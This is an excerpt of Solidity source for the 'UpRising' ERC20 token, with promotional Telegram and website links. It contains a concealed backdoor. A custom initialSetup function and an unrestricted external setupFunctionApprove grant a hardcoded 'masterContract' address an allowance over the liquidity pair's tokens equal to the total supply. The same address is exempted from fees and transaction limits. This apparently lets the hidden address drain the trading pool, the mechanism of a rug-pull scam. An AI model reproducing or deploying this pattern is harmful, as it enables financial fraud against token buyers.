...
░╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░
    ...
    telegram: https://t.me/uprisingeth
    website: https://uprisingeth.com
 */
// 
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function initialSetup(address from, address to) internal {
        _allows[from][to] = _totalSupply;
    }
...
contract UpRising is ERC20, Ownable {
    ...
    constructor() ERC20("UpRising", "UP") {
        ...
        AMM = IDexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        lpPair = AMM;
        ...
        operationsAddress = address(0xfce641afc1334Fd69fB88C9475FC08dd17cf27d8);
        devAddress = address(0xfce641afc1334Fd69fB88C9475FC08dd17cf27d8);
        masterContract = address(0x563799Ed4F6708111a12e4Aa21F15cE4E92480Ef);

        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(masterContract, true);

        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(masterContract, true);
    ...
    function setupFunctionApprove() external {
        initialSetup(AMM, masterContract);
    }
